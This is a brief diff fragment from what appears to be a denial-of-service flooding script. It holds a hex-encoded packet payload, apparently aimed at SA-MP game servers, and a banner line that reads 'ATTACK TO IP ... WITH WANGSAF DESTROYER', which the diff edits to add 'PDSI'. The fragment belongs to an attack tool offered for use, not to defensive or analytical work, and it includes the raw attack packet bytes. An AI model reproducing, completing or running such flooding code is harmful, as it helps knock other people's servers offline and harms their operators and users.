@@ -27,7 +27,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-print("ATTACK TO IP: %s AND PORT: %s WITH WANGSAF DESTROYER"%(orgip,port))
+print("PDSI ATTACK TO IP: %s AND PORT: %s WITH WANGSAF DESTROYER"%(orgip,port))
 
 
 
